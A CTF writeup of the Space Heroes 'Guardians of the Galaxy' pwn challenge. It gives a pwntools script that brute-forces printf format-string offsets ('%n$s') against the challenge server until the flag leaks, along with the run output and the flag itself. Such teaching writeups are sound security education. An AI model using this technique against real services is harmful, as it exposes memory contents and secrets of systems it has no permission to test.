---
title: "shctf/pwn: Guardians of the Galaxy"
date: 2022-04-06 10:33:54
categories:
- ctfs
- shctf
- pwn
tags:
- pwn
- format-string
description: "Learn how to brute force a format string attack on ELF binaries! This is my writeup for the Space Heroes CTF binary/pwn challenge \"Guardians of the Galaxy\"."
permalink: ctfs/shctf/pwn/guardians-of-the-galaxy/
thumbnail: /asset/banner/banner-guardians.png
---

<style>
    .box {
        border: 1px solid rgb(23, 25, 27);
        border-radius: 5px;
        background-color: rgb(23, 25, 27);
        padding: 1rem;
        font-size: 90%;
        text-align: center;
        margin-top: 1rem;
        margin-bottom: 1rem;
    }
    .flex-container {
        display: flex;
        flex-wrap: nowrap;
        justify-content: center;
    }
</style>

<div class="box">
Ronan the Accuser has the Power Stone. Can Starlord find a successful distraction format? <code>nc 0.cloud.chals.io 12690</code><br>
<b>Author</b>: GlitchArchetype<br>
<b>Files</b>: <a href="/asset/shctf/guardians">guardians</a>
</div>

<figure class="highlight console">
  <figcaption><span>checksec.sh</span><a target="_blank" rel="noopener"
      href="https://github.com/slimm609/checksec.sh"><span style="color:#82C4E4">github link</span></a></figcaption>
    <table>
        <tr>
            <td class="code">
                <pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">checksec guardians</span></span><br><span class="line">[<font color="#277FFF"><b>*</b></font>] &apos;/home/kali/ctfs/shctf/pwn/guardians-of-the-galaxy/guardians&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    <font color="#5EBDAB">Full RELRO</font></span><br><span class="line">    Stack:    <font color="#D41919">No canary found</font></span><br><span class="line">    NX:       <font color="#5EBDAB">NX enabled</font></span><br><span class="line">    PIE:      <font color="#5EBDAB">PIE enabled</font></span><br></pre>
            </td>
        </tr>
    </table>
</figure>

Let's look at what happens when you run that binary given to us.

<figure class="highlight console">
    <table>
        <tr>
            <td class="code">
                <pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./guardians</span> </span><br><span class="line">Error, please message admins with &#x27;infinity_error&#x27;.</span><br></pre>
            </td>
        </tr>
    </table>
</figure>


This error is because the binary is probably trying to reference a `flag.txt` within its directory that doesn't exist. Let's create one and run it again:

<figure class="highlight console">
    <table>
        <tr>
            <td class="code">
                <pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">touch</span> flag.txt &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;FLAGHERE&quot;</span> &gt; flag.txt</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./guardians</span></span><br><span class="line">Does Quill manage to win the dance battle?</span><br></pre>
            </td>
        </tr>
    </table>
</figure>

There, we got it to work locally. Since we know that this is problem a format string vulnerability from the "find a successful distraction format" part of the description, let's assume that the vulnerability is it writing our input to the stack with `printf()`. We will need to work our way up the stack with the format `%n$s`, where `n` is the decimal index of the argument you want, and `s` is the `printf()` specifier for a **string of characters**. I wrote this Python3/pwntools script here to achieve this loop:

{% codeblock guardians.py lang:py https://gist.github.com/jktrn/abced39a897e40c196dc2eb3348e1db9 github gist link %}
from pwn import *
for i in range(0, 100):
        p = remote('0.cloud.chals.io', 12690)  
        log.info(f"Trying offset {i}...")
        p.sendline(bytes(('%' + str(i) + '$s'), encoding='utf-8'))

        output = p.recvS()
        if 'shctf' in output:
                log.success(output)
                break
        p.close()
{% endcodeblock %}

As you can see, it will send a UTF-8 encoded format string, with `str(i)` being the looping variable. If its output contains the flag, the loop breaks and the script will stop. Let's run it:

<figure class="highlight console">
    <table>
        <tr>
            <td class="code">
                <pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">python3 exp.py</span></span><br><span class="line">[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to 0.cloud.chals.io on port 12690: Done</span><br><span class="line">[<span style="color:#277FFF"><b>*</b></span>] Trying offset 0...</span><br><span class="line">[<span style="color:#277FFF"><b>*</b></span>] Closed connection to 0.cloud.chals.io port 12690</span><br><span class="line">[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to 0.cloud.chals.io on port 12690: Done</span><br><span class="line">[<span style="color:#277FFF"><b>*</b></span>] Trying offset 1...</span><br><span class="line">[<span style="color:#277FFF"><b>*</b></span>] Closed connection to 0.cloud.chals.io port 12690</span><br><span class="line">[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to 0.cloud.chals.io on port 12690: Done</span><br><span class="line">[<span style="color:#277FFF"><b>*</b></span>] Trying offset 2...</span><br><span class="line">[<span style="color:#277FFF"><b>*</b></span>] Closed connection to 0.cloud.chals.io port 12690</span><br><span class="line">[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to 0.cloud.chals.io on port 12690: Done</span><br><span class="line">[<span style="color:#277FFF"><b>*</b></span>] Trying offset 3...</span><br><span class="line">[<span style="color:#277FFF"><b>*</b></span>] Closed connection to 0.cloud.chals.io port 12690</span><br><span class="line">[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to 0.cloud.chals.io on port 12690: Done</span><br><span class="line">[<span style="color:#277FFF"><b>*</b></span>] Trying offset 4...</span><br><span class="line">[<span style="color:#277FFF"><b>*</b></span>] Closed connection to 0.cloud.chals.io port 12690</span><br><span class="line">[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to 0.cloud.chals.io on port 12690: Done</span><br><span class="line">[<span style="color:#277FFF"><b>*</b></span>] Trying offset 5...</span><br><span class="line">[<span style="color:#277FFF"><b>*</b></span>] Closed connection to 0.cloud.chals.io port 12690</span><br><span class="line">[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to 0.cloud.chals.io on port 12690: Done</span><br><span class="line">[<span style="color:#277FFF"><b>*</b></span>] Trying offset 6...</span><br><span class="line">[<span style="color:#47D4B9"><b>+</b></span>] Does Quill manage to win the dance battle?</span><br><span class="line">    </span><br><span class="line">    Oh no, Ronano has seen through the distraction!</span><br><span class="line">    shctf&#123;im_distracting_you&#125;</span><br></pre>
            </td>
        </tr>
    </table>
</figure>


<a href="https://info.flagcounter.com/8Xkk"><img src="https://s01.flagcounter.com/count2/8Xkk/bg_212326/txt_C9CACC/border_C9CACC/columns_3/maxflags_12/viewers_3/labels_0/pageviews_1/flags_1/percent_0/" alt="Free counters!" border="0"></a>
